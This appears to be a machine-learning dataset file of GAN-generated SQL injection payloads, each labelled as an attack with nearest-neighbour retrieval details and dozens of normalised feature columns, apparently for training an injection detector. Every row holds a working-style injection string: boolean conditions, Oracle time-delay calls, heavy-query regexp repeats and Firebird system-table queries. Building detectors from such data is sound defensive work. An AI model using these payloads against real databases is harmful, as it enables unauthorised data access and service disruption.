id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000290,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,4.856201557539859,206.39305114746094,31.541425704956055,23.03446388244629,52.85356140136719,-0.023429440334439278,54.38988494873047,22.43297004699707,0.9986382126808167,0.3165234625339508,0.1603715866804123,0.3902800679206848,0.11552198231220245,3.9325673580169678,0.8377842307090759,0.8443681597709656,0.7783605456352234,-0.05811038985848427,-0.0265488438308239,0.011672033928334713,5.437722206115723,7.973959445953369,1.3355861902236938,0.010845847427845001,1.3199026584625244,-0.009717990644276142,0.04664101451635361,0.32082006335258484,0.29446396231651306,0.2595524787902832,0.07920408248901367,-0.27132880687713623,0.3752669095993042,-0.17899759113788605,0.5520758628845215,1.2715425491333008,6.280303478240967,2.198594093322754,0.3248642086982727,0.17565923929214478,0.5332304835319519,0.2962425649166107,0.37403765320777893,-0.23120087385177612,0.05755751579999924,-0.34266939759254456,0.691154956817627,0.2526644766330719,0.040718838572502136,0.17626219987869263,0.07622658461332321,0.08976796269416809,-0.29483506083488464,0.1244790330529213,0.12536974251270294,-0.2853947877883911,0.014979222789406776,-0.22533933818340302,0.053285129368305206,1.0652059316635132,-0.011675400659441948,-0.33211392164230347,-0.01308443769812584,1.064453363418579,0.5754230618476868,-0.0031869993545114994,0.011525463312864304,-0.045725978910923004,-0.8223616480827332,-0.5895841121673584,0.20417621731758118,0.13498494029045105,-0.02032262086868286,-0.06808356940746307,-0.5452408790588379,-0.657843828201294,0.7039939761161804,0.43843090534210205,-0.5260233283042908,0.23102064430713654,0.08970977365970612,4.691123962402344,0.8371181488037109,-0.03223513811826706,0.10500048846006393,-0.06174097955226898,-0.0979471504688263,-0.5151985883712769,0.03818767890334129
GAN_000291,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,5.510244075742886,138.7907257080078,6.572891712188721,25.646583557128906,25.026187896728516,-0.02981845661997795,19.077312469482422,10.092456817626953,0.9987932443618774,0.20764866471290588,0.28038570284843445,0.4611504375934601,0.12467314302921295,3.4145073890686035,0.3115784227848053,0.9476698040962219,1.48518705368042,0.01026163250207901,-0.10583527386188507,-0.013709177263081074,1.4099141359329224,7.719344139099121,-0.7410475611686707,0.016817932948470116,1.259902000427246,-0.005016475450247526,0.07299622893333435,0.37370702624320984,1.1560709476470947,-0.025675607845187187,0.10473556071519852,-0.5809855461120605,0.2519546449184418,0.09339474141597748,0.38773947954177856,1.220524787902832,4.360908031463623,2.0259385108947754,-0.44748812913894653,0.0646197721362114,0.6179949641227722,-0.13973355293273926,0.032820142805576324,5.895644426345825e-05,0.09427996724843979,-0.36993661522865295,0.8776329755783081,0.3523626923561096,-0.00899683777242899,0.10253795981407166,0.16011936962604523,0.005188591778278351,-0.5506721138954163,0.16950157284736633,0.2935503125190735,-0.10418712347745895,0.02119484357535839,-0.04020288586616516,-0.1055062934756279,0.9722376465797424,-0.015002282336354256,-0.05759815499186516,-0.023362871259450912,0.5629500150680542,0.764717161655426,0.028567053377628326,0.07015836983919144,0.05129840224981308,-1.1445637941360474,-0.916147768497467,0.31819260120391846,-0.30439579486846924,-0.29789066314697266,-0.12096517533063889,-0.4776518642902374,-0.14586715400218964,0.4229612648487091,0.3057555556297302,-0.525378942489624,0.18351827561855316,-0.1050177812576294,0.08843488246202469,0.8335034251213074,0.17072996497154236,-0.28278568387031555,-0.23564542829990387,-0.06329265981912613,-0.9631483554840088,0.03522438928484917
GAN_000292,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,5.059310576804314,215.5608673095703,33.26742172241211,27.597875595092773,62.02238464355469,-0.025198105722665787,67.58572387695312,22.9096622467041,0.9994220733642578,0.33506160974502563,0.15485447645187378,0.3825879991054535,0.10872127115726471,3.957698345184326,0.9069263935089111,0.9284926652908325,0.9110997319221497,0.021418150514364243,0.020749609917402267,0.04072228819131851,6.037243366241455,8.138134956359863,1.8550387620925903,0.0013966773403808475,1.3655579090118408,-0.0035769017413258553,0.013720382004976273,0.3808823823928833,1.0692822933197021,0.3386123478412628,0.074803426861763,-0.5017834901809692,0.44862237572669983,-0.0943431407213211,0.5199515223503113,1.3775413036346436,5.772677898406982,2.1972453594207764,0.2945353090763092,0.14686843752861023,0.5139318108558655,0.36741602420806885,0.26010024547576904,-0.28546038269996643,-0.0014893636107444763,-0.29357585310935974,0.5015856623649597,0.3265504837036133,0.12908616662025452,0.24601499736309052,0.15904434025287628,0.12676872313022614,-0.39239734411239624,-0.05327126383781433,0.08565996587276459,-0.07660219818353653,0.016438128426671028,-0.012476534582674503,-0.21341150999069214,1.0641578435897827,-0.008045734837651253,0.21955914795398712,-0.009874547831714153,1.7277112007141113,0.6160639524459839,-0.008942141197621822,-0.0011776970932260156,0.18818911910057068,-0.6842460036277771,-0.42481645941734314,0.1070655807852745,0.026711871847510338,0.06395002454519272,-0.08081702142953873,-0.49296295642852783,-0.6303881406784058,0.6287853121757507,0.37631797790527344,-0.500583827495575,0.24926802515983582,-0.3374992311000824,4.715948581695557,0.8380152583122253,0.29576119780540466,-0.1194356307387352,0.05430605262517929,-0.34410348534584045,-0.633535623550415,0.04140657186508179
GAN_000293,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,5.139953956567773,172.197265625,10.369873046875,21.19648551940918,48.24709701538086,-0.03799273073673248,26.481599807739258,14.9029541015625,0.999610960483551,0.24682943522930145,0.17538264393806458,0.45747581124305725,0.12220636755228043,3.7572646141052246,0.5228127837181091,1.654170036315918,1.834911584854126,-0.013694841414690018,-0.0856589674949646,0.0007727851043455303,3.2843306064605713,8.245936393737793,1.573879361152649,0.008250989951193333,1.0705565214157104,-0.022169962525367737,0.10830269753932953,0.1028934046626091,0.19655509293079376,0.22584031522274017,0.13686229288578033,-0.09316292405128479,0.23565629124641418,0.242927685379982,0.9635049104690552,0.8825849294662476,2.678851366043091,1.6965235471725464,-0.38811981678009033,0.3559255003929138,0.6015418767929077,0.1134723350405693,-0.18164125084877014,-0.01745644211769104,-0.40647822618484497,0.2037217915058136,0.5467223525047302,0.2569337487220764,-0.1394878476858139,-0.0010047785472124815,-0.10803195089101791,0.15581870079040527,-0.28996315598487854,-0.08791597187519073,-0.007171209901571274,-0.12550827860832214,0.01476283185184002,-0.05326022207736969,0.13867026567459106,0.6447033286094666,-0.017462946474552155,0.7891433835029602,-0.019032718613743782,-0.9259516000747681,0.04114909470081329,-0.06015465408563614,0.05931105464696884,0.11001113802194595,-1.199862003326416,-0.8003185987472534,0.2571153938770294,-0.03467965126037598,-0.3139796555042267,-0.07586241513490677,-0.6596958041191101,-0.2544158697128296,0.4755394160747528,0.14065879583358765,-0.5993805527687073,-0.0788685530424118,-0.42596882581710815,2.0900893211364746,0.7446032166481018,0.19290705025196075,-0.6670036911964417,-0.49118614196777344,-0.0020020566880702972,0.07644371688365936,0.010077103972434998
GAN_000294,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,5.329260845497192,132.41702270507812,28.501197814941406,17.508991241455078,34.714691162109375,-0.02745891734957695,10.225924491882324,17.28023910522461,1.000079870223999,0.17888788878917694,0.2376558631658554,0.42637312412261963,0.12687905132770538,3.4434902667999268,1.125166416168213,1.153822898864746,2.3040120601654053,-0.0787229910492897,-0.17498137056827545,-0.037503018975257874,0.7414683699607849,5.753528118133545,0.47408321499824524,0.03296380862593651,0.9164891839027405,-0.01860920898616314,0.10972660779953003,0.1310943067073822,0.3943876624107361,-0.012251688167452812,0.09639494121074677,-0.28349053859710693,0.3841535151004791,0.6531473994255066,0.9184758067131042,0.976557731628418,1.1108577251434326,1.2923877239227295,-0.026149461045861244,0.06086817383766174,0.843613862991333,0.010823572054505348,0.1595442295074463,-0.013155430555343628,-0.17299297451972961,0.3775634467601776,0.6721497774124146,0.2864780128002167,-0.020031698048114777,-0.05901362746953964,-0.15868814289569855,0.08932358026504517,-0.504153847694397,-0.46321964263916016,0.07137082517147064,-0.28587865829467773,0.041571877896785736,-0.19009052217006683,-0.31338533759117126,0.9193587303161621,-0.023523934185504913,0.42212408781051636,-0.015082797035574913,-0.41841211915016174,0.7484450936317444,0.0003026215417776257,0.12429982423782349,-0.13833294808864594,-0.990109920501709,-1.1010483503341675,0.35343626141548157,-0.7629257440567017,-0.44342732429504395,-0.12301107496023178,-0.6586402654647827,-0.09728862345218658,0.3740876019001007,0.3317123055458069,-0.46387049555778503,-0.14795131981372833,-0.4325282573699951,1.0852675437927246,0.8535244464874268,0.226362943649292,-0.7496505379676819,0.15856412053108215,0.16574043035507202,-0.5554075241088867,0.024716658517718315
GAN_000295,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,4.790831285305716,229.51361083984375,50.478790283203125,23.486255645751953,72.48897552490234,-0.06256682425737381,56.42056655883789,27.963146209716797,0.9997727274894714,0.3354370594024658,0.0909671038389206,0.37126287817955017,0.11622204631567001,4.090493202209473,1.493510127067566,1.161245584487915,1.3246090412139893,-0.05024070665240288,0.07194052636623383,0.028189508244395256,7.173861026763916,7.841495990753174,3.356475353240967,0.004188016522675753,1.1691927909851074,-0.019391141831874847,0.052505891770124435,0.10879328101873398,0.24476470053195953,0.5123001337051392,0.0747826024889946,-0.060009658336639404,0.37290841341018677,0.2310214340686798,0.9339282512664795,1.093092441558838,4.5807318687438965,1.8658409118652344,0.5812762379646301,0.2253369688987732,0.48274433612823486,0.5062390565872192,0.16025617718696594,-0.2880846858024597,-0.4927520751953125,0.12179134786128998,0.28467655181884766,0.2029028981924057,0.05092725157737732,0.11164631694555283,-0.11209515482187271,0.1735059767961502,-0.13812756538391113,-0.2748182415962219,-0.274530291557312,-0.2515951693058014,0.02449154481291771,-0.06370319426059723,-0.03327199071645737,0.8300491571426392,-0.015181906521320343,0.35980838537216187,-0.007601586170494556,0.6270310878753662,0.19215108454227448,-0.0457480326294899,0.0304790697991848,-0.1874055713415146,-0.6882500648498535,-0.31637459993362427,0.2541477084159851,0.04720088839530945,0.11838896572589874,-0.036170318722724915,-0.4973796606063843,-0.6467695832252502,0.7964344620704651,0.3123374879360199,-0.5434481501579285,0.0928882360458374,-0.378385990858078,5.573628902435303,0.8170826435089111,0.07450210303068161,-0.3657948672771454,-0.061349764466285706,-0.033836014568805695,-0.09460006654262543,0.012926106341183186
GAN_000296,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,5.45548860637204,245.88824462890625,43.83645248413086,27.29158592224121,79.27137756347656,-0.0404629223048687,68.3006820678711,23.808900833129883,0.9991816878318787,0.3883730471134186,0.09371422231197357,0.38623419404029846,0.09491558372974396,4.1087799072265625,1.0208966732025146,1.1583378314971924,0.7863757610321045,0.010766487568616867,0.07155683636665344,0.06892610341310501,7.507343292236328,8.724656105041504,2.923548936843872,0.019385555759072304,1.2922202348709106,-0.013392441906034946,0.03972191363573074,0.3511658012866974,0.9165273904800415,0.31976383924484253,0.09115922451019287,-0.203608438372612,0.4446756839752197,-0.02139611914753914,0.6425860524177551,1.1666041612625122,5.986935615539551,2.3299720287323,0.6255305409431458,0.3921669125556946,0.5179268717765808,0.6097730994224548,0.14558160305023193,-0.222299724817276,0.0017915666103363037,-0.6000505685806274,0.43258726596832275,0.3372262418270111,0.04642508924007416,0.21806058287620544,0.10495594143867493,0.16165918111801147,-0.43547487258911133,0.04120032489299774,-0.03439731150865555,-0.3622684180736542,0.023275718092918396,-0.04404100775718689,-0.14021578431129456,1.0161219835281372,-0.010914071463048458,0.17669770121574402,-0.016085267066955566,0.9400882720947266,0.7691521644592285,0.0044297887943685055,-0.0021282308734953403,0.24819710850715637,-0.8150634765625,-0.501295804977417,0.18760710954666138,-0.2016827017068863,-0.1252324879169464,-0.08913331478834152,-0.5199344754219055,-0.6398001313209534,0.6834208965301514,0.2633419930934906,-0.5347213745117188,0.2538512945175171,-0.33847352862358093,6.099668502807617,0.7839369177818298,0.09293778985738754,-0.5046244859695435,-0.09918554127216339,-0.4476781189441681,-0.5256171226501465,0.01449641864746809
GAN_000297,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,8.338267772284395,290.2579650878906,43.72903823852539,20.681564331054688,86.91940307617188,-0.13671177625656128,45.30459976196289,30.481565475463867,1.0003465414047241,0.34354934096336365,0.04194194823503494,0.43390175700187683,0.08993794023990631,4.357212066650391,0.9295285940170288,2.386899471282959,2.067064046859741,-0.11579874902963638,0.06407153606414795,0.053235989063978195,8.354331016540527,10.047082901000977,4.809546947479248,0.005937844980508089,0.678268551826477,-0.04976511374115944,0.14352156221866608,-0.0494646355509758,0.15001289546489716,0.36661675572395325,0.19427065551280975,0.31883955001831055,0.4877780079841614,0.43199336528778076,1.641256332397461,0.440748393535614,4.2600250244140625,2.3964250087738037,0.35699787735939026,0.758552610874176,0.5815181732177734,0.49452435970306396,-0.09361845999956131,-0.15288694202899933,-0.9938326478004456,0.2688889801502228,0.7472565770149231,0.36565086245536804,-0.18967081606388092,-0.13852767646312714,-0.4647091329097748,0.22921712696552277,-0.41228482127189636,-0.2684628367424011,-0.571664571762085,-0.5169652700424194,0.036745283752679825,-0.16126884520053864,-0.13321200013160706,1.064983606338501,-0.02466842345893383,1.057655692100525,-0.03254209831357002,-1.7086015939712524,0.4396374523639679,-0.12683320045471191,0.11901090294122696,0.004079841077327728,-1.7695953845977783,-0.994525671005249,0.5473079085350037,-0.31723853945732117,-0.575933575630188,-0.12818484008312225,-0.7554242610931396,-0.8583971261978149,0.5811176896095276,-0.029139792546629906,-0.9457401633262634,-0.115541473031044,-0.8911914825439453,4.902813911437988,0.5843815803527832,-0.02804718166589737,-1.3439432382583618,-0.3771684765815735,-0.02755623310804367,0.165636345744133,-0.03903413191437721
GAN_000298,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,5.03490455991504,238.42726135253906,44.226295471191406,21.687902450561523,71.79631805419922,-0.025948476046323776,66.31429290771484,25.910911560058594,0.9992057085037231,0.34613481163978577,0.07185866683721542,0.37874212861061096,0.10828235745429993,4.180345058441162,1.0510097742080688,1.330956220626831,1.1517680883407593,-0.0920465961098671,0.10634543001651764,0.028232391923666,6.355373382568359,9.192373275756836,3.330703020095825,0.011877140030264854,1.191779613494873,-0.02136671170592308,0.06368009746074677,0.28816813230514526,0.4908621311187744,0.4712384343147278,0.10133880376815796,0.11924490332603455,0.38265490531921387,0.143964484333992,0.9841517806053162,0.9866425395011902,4.343895435333252,1.8588383197784424,0.39793136715888977,0.24584504961967468,0.4131084084510803,0.6057397723197937,0.0035746097564697266,-0.1844238042831421,-0.592581570148468,0.18423691391944885,0.31467729806900024,0.22598807513713837,0.027116671204566956,0.062091533094644547,-0.06766525655984879,0.15291303396224976,-0.19919154047966003,-0.06833215057849884,-0.22332341969013214,-0.024096615612506866,0.007598165888339281,-0.004231907892972231,0.007631778717041016,0.6887152791023254,-0.009741495363414288,0.47591209411621094,-0.010088387876749039,-0.13162733614444733,0.17790725827217102,-0.07121407985687256,0.009720445610582829,-0.18492284417152405,-0.8334566950798035,-0.4924897849559784,0.183437317609787,0.11285474896430969,-0.08877626806497574,-0.05359785258769989,-0.7764443755149841,-0.6597991585731506,0.8384926915168762,0.25411880016326904,-0.3386751711368561,0.07208073884248734,-0.4266936182975769,5.529155254364014,0.7298277020454407,-0.05186650902032852,-0.38520127534866333,-0.19206006824970245,-0.11759187281131744,0.028395339846611023,0.0038515105843544006
GAN_000299,attack,boolean,"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000517,5.450418085495768,205.81781005859375,30.941959381103516,20.774866104125977,65.10629272460938,-0.09280534088611603,28.409156799316406,21.640100479125977,1.000464677810669,0.35895389318466187,0.16085590422153473,0.4117385149002075,0.1195971891283989,4.01569938659668,0.9356011152267456,0.9915098547935486,1.428778052330017,0.04963512346148491,-0.04362935200333595,0.08334855735301971,5.416342258453369,7.554892063140869,3.470533847808838,-0.002809046534821391,0.9559475779533386,-0.028932901099324226,0.06539607048034668,0.13380110263824463,-0.20336110889911652,0.24394741654396057,0.11814270168542862,0.03180500864982605,0.3108658790588379,0.2777172327041626,1.0252398252487183,0.8092896938323975,4.847677707672119,1.888756275177002,0.2248176485300064,0.6947633624076843,0.35085001587867737,0.26567399501800537,-0.0589895024895668,-0.21028625965118408,-0.6009131669998169,0.03515756130218506,0.6045210361480713,0.25869014859199524,-0.1113433912396431,-0.06654540449380875,-0.22922278940677643,0.0777149349451065,-0.05725441128015518,-0.40826383233070374,-0.18401849269866943,-0.39828822016716003,0.03165750950574875,-0.058336734771728516,0.06971580535173416,0.8074477910995483,-0.02276993729174137,0.2972850203514099,-0.017063580453395844,0.388670414686203,0.11649641394615173,-0.04249031841754913,0.04867137596011162,-0.05105828493833542,-1.1047011613845825,-0.5113634467124939,0.39089906215667725,-0.06438455730676651,-0.2892385721206665,-0.05575162172317505,-0.5028553009033203,-0.42445993423461914,0.6506087779998779,0.40298402309417725,-0.8112087249755859,0.13472747802734375,-0.24307119846343994,4.724173069000244,0.6997608542442322,0.17628972232341766,-0.5972709655761719,-0.3600005507469177,-0.11469639837741852,0.01995895802974701,-0.032249972224235535
GAN_000300,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,4.727182400905857,235.67547607421875,43.12605667114258,23.776845932006836,80.16057586669922,-0.03224277123808861,63.07182693481445,25.904531478881836,0.9992873072624207,0.37048330903053284,0.0727536752820015,0.3803554177284241,0.11157021671533585,4.110907077789307,1.0628108978271484,1.2382140159606934,0.9608680009841919,-0.00784112885594368,0.1160159632563591,0.05645426735281944,6.53253173828125,9.251888275146484,3.9134414196014404,-0.006486428435891867,1.2938368320465088,-0.015000317245721817,0.026424311101436615,0.2983783185482025,0.5622721314430237,0.624694287776947,0.0709066092967987,0.027458220720291138,0.33843398094177246,-0.005880318582057953,0.8583753108978271,1.2140443325042725,4.988681316375732,1.8060353994369507,0.4185045659542084,0.2925243675708771,0.3570733666419983,0.6288776397705078,0.06952981650829315,-0.20941942930221558,-0.4732941687107086,0.047381848096847534,0.24314503371715546,0.2145707607269287,0.06840594112873077,0.11331807076931,-0.02998078614473343,0.126759335398674,-0.031718067824840546,-0.09617098420858383,-0.13807085156440735,-0.11505424231290817,0.008368805050849915,0.028488777577877045,0.030988730490207672,0.6304086446762085,-0.006524194963276386,0.40222132205963135,-0.006110196001827717,0.5022805333137512,0.0677620992064476,-0.05204714834690094,-0.004579879809170961,-0.012234188616275787,-0.590381383895874,-0.22685346007347107,0.07954017072916031,0.1639534831047058,-0.003362182527780533,-0.031518254429101944,-0.5785441398620605,-0.6344434022903442,0.9864336252212524,0.3656991422176361,-0.47249647974967957,0.14303511381149292,-0.3383333384990692,5.73307991027832,0.7508686184883118,0.02584853768348694,-0.26646557450294495,-0.4185104966163635,-0.37153199315071106,0.02490420639514923,-0.0015655701281502843
GAN_000301,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,6.038614180886389,289.65765380859375,63.52980422973633,26.34283447265625,97.79096984863281,-0.0741637796163559,79.52017211914062,34.11349868774414,0.9990605115890503,0.3843698501586914,-0.014145472086966038,0.364331990480423,0.09143104404211044,4.256530284881592,1.5928682088851929,1.947806715965271,1.2899556159973145,-0.11778902262449265,0.22363734245300293,0.025299424305558205,9.339542388916016,9.652198791503906,4.827385425567627,0.014552619308233261,1.1773853302001953,-0.02100284770131111,0.04326426237821579,0.09688442200422287,1.2803243398666382,0.7356863617897034,0.07526606321334839,0.31364917755126953,0.485571950674057,0.04905817657709122,1.1487678289413452,1.0223445892333984,5.384381294250488,2.2267026901245117,0.9324980974197388,0.2171700894832611,0.45484331250190735,0.7914789319038391,0.11702565848827362,-0.1268261969089508,-0.6764013171195984,0.06414465606212616,0.3062821626663208,0.19738295674324036,0.10429459810256958,0.1369357407093048,-0.11242444068193436,0.24551793932914734,-0.2608533203601837,-0.04770136997103691,-0.4896119236946106,-0.031637199223041534,0.022404832765460014,0.060082729905843735,-0.2319471389055252,0.8229267597198486,-0.010105708613991737,0.753033459186554,-0.01317654363811016,0.21824507415294647,0.49408072233200073,-0.07621827721595764,0.03475015610456467,-0.04801591485738754,-0.6927154064178467,-0.2335246205329895,0.12268843501806259,-0.15022629499435425,0.18416139483451843,-0.04631105065345764,-0.539080798625946,-0.7664512395858765,0.9606328010559082,0.13476991653442383,-0.19147798418998718,0.16358570754528046,-0.7053095698356628,7.136911869049072,0.6986521482467651,-0.2784305810928345,-0.5301629900932312,-0.1526002138853073,-0.1787670999765396,-0.19097290933132172,0.009358408860862255
GAN_000302,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,5.44281763074322,134.43214416503906,2.537498950958252,20.401111602783203,33.34174728393555,-0.02628912404179573,16.436065673828125,9.663374900817871,0.9989829659461975,0.22660709917545319,0.26032233238220215,0.43611761927604675,0.1299341768026352,3.571622848510742,0.5841922163963318,0.5273265242576599,1.5819942951202393,-0.06185794994235039,-0.2760063111782074,0.004746453836560249,2.1195263862609863,7.355677127838135,-0.2092737853527069,0.028439048677682877,1.0401545763015747,-0.013710436411201954,0.08472316712141037,0.10879186540842056,0.19984115660190582,-0.08608897030353546,0.11395511031150818,-0.5595845580101013,0.24107137322425842,0.05748651921749115,0.5930978059768677,0.9094206690788269,2.904733180999756,1.7717467546463013,-0.5704283118247986,0.3699927031993866,0.8017357587814331,-0.06042024865746498,0.08638618141412735,-0.16920068860054016,0.09228647500276566,0.02340538799762726,0.7561488747596741,0.30881255865097046,-0.14451439678668976,0.07238523662090302,0.023622065782546997,0.033761367201805115,-0.22588908672332764,-0.1330006867647171,0.4523615539073944,-0.2007257342338562,-0.007382644806057215,-0.3445889949798584,0.2748730480670929,0.9480578303337097,-0.02162141539156437,0.08642832934856415,-0.015269117429852486,-0.10308386385440826,0.31132757663726807,0.046157028526067734,0.02578149363398552,0.16668406128883362,-1.2033090591430664,-1.0764210224151611,0.11487996578216553,-0.09000853449106216,-0.38556504249572754,-0.1215231791138649,-0.872602641582489,-0.2968442142009735,0.24767783284187317,0.3727533221244812,-0.6317756175994873,-0.05488938093185425,0.031157560646533966,0.482557475566864,0.915587306022644,0.1605001538991928,-0.3527342975139618,-0.3752092123031616,0.05973083898425102,-0.33244431018829346,0.051662664860486984
GAN_000303,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,4.755610355801852,63.07707595825195,10.164310455322266,17.145069122314453,9.120000839233398,-0.02168656513094902,-9.378510475158691,11.947000503540039,1.0002027750015259,0.11296845227479935,0.35133248567581177,0.428984671831131,0.15170633792877197,3.1101341247558594,0.8751243948936462,0.7848167419433594,2.444969654083252,-0.026902619749307632,-0.29972657561302185,-0.048605646938085556,-0.45936137437820435,4.345082759857178,-1.1864690780639648,0.030184179544448853,0.9874933362007141,-0.011365906335413456,0.10652527213096619,0.134000763297081,-0.3428744673728943,-0.08493883907794952,0.08349858969449997,-0.5474885702133179,0.2459777444601059,0.3594907522201538,0.7782720327377319,1.207199215888977,0.7512242197990417,0.8464773297309875,-0.43767744302749634,0.04783972352743149,0.8788460493087769,-0.2926912307739258,0.031073078513145447,-0.09009024500846863,0.10206053406000137,0.6124250292778015,0.6495177149772644,0.23578403890132904,-0.06933180242776871,-0.03938554972410202,-0.16671176254749298,0.06127972900867462,-0.1827596127986908,-0.28308650851249695,0.30652758479118347,-0.31306523084640503,0.04481732100248337,-0.25928324460983276,0.00013621896505355835,0.7610653042793274,-0.024042170494794846,0.010652147233486176,-0.012558454647660255,0.39224550127983093,0.4687313139438629,0.02501629665493965,0.12876521050930023,-0.20488068461418152,-0.8622252345085144,-1.0536524057388306,0.48047080636024475,-0.41300565004348755,-0.34511104226112366,-0.10024289041757584,-0.4208037555217743,0.07121440023183823,0.2850717008113861,0.5714635848999023,-0.4178031384944916,-0.18436290323734283,-0.0853775143623352,-0.44733887910842896,0.9675673842430115,0.3538362681865692,-0.3242565393447876,0.08630910515785217,0.33204197883605957,-0.394245445728302,0.04096749797463417
